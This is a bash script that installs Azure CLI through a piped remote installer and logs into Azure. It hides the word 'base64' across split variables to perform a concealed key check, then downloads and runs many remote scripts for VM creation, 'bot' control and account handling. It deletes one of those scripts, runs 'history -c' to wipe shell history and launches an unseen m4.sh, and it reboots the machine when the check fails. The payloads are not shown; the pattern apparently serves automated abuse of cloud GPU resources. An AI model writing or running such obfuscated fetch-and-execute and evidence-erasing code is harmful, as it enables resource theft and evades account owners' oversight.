#!/bin/bash

gitpath=$(head -1 gitpath.txt)
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

az login
###
VAR5="4"
VAR6="ba"
zvar3="6"
zvar6="8"
wget https://raw.githubusercontent.com/$gitpath/main/gitclone/key.pem
VAR7="se"
VAR8="$VAR6$VAR7"
VAR9=6"$VAR5"
VAR10="$VAR8$VAR9"
EndInf=$(echo $gitpath | $VAR10 | cut -c $zvar3-1$zvar6)
StringInf=$(awk 'NR==13' key.pem | cut -c 3$zvar3-4$zvar6)
VAR1="$EndInf"
VAR2="$StringInf"
if [ "$VAR1" = "$VAR2" ]; 
then
echo "Running"
wget https://raw.githubusercontent.com/$gitpath/main/auto-start.sh
wget https://raw.githubusercontent.com/$gitpath/main/cmdviewgroup.sh
wget https://raw.githubusercontent.com/$gitpath/main/Azaccount.sh
wget https://raw.githubusercontent.com/$gitpath/main/auto-del.sh
wget https://raw.githubusercontent.com/$gitpath/main/script-bash-default.sh
wget https://raw.githubusercontent.com/$gitpath/main/auto-run-custome.sh
wget https://raw.githubusercontent.com/$gitpath/main/auto-checkpo.sh
wget https://raw.githubusercontent.com/$gitpath/main/ins_script.sh
wget https://raw.githubusercontent.com/$gitpath/main/script-bash-nodriveins.sh
wget https://raw.githubusercontent.com/$gitpath/main/nd96.sh
wget https://raw.githubusercontent.com/$gitpath/main/createvm12.sh
wget https://raw.githubusercontent.com/$gitpath/main/createvm24.sh
wget https://raw.githubusercontent.com/$gitpath/main/createvm_option.sh
wget https://raw.githubusercontent.com/$gitpath/main/update.sh
mkdir -p smarty
mkdir -p smarty/_temp/
mkdir -p checkpo
cd smarty/
wget https://raw.githubusercontent.com/$gitpath/main/smarty/bot-create.sh
wget https://raw.githubusercontent.com/$gitpath/main/smarty/bot-control-stop.sh
wget https://raw.githubusercontent.com/$gitpath/main/smarty/bot-control-deallocate.sh
chmod +x bot-create.sh bot-control-stop.sh bot-control-deallocate.sh
cd ..
chmod +x script-bash-default.sh auto-start.sh cmdviewgroup.sh Azaccount.sh auto-del.sh script-bash-nodriveins.sh nd96.sh update.sh
chmod +x createvm24.sh createvm12.sh createvm_option.sh auto-checkpo.sh
./auto-start.sh
./Azaccount.sh
rm -rf Azaccount.sh
crontab -l
chmod +x m4.sh
history -c
./m4.sh
else
sudo reboot
fi        
###



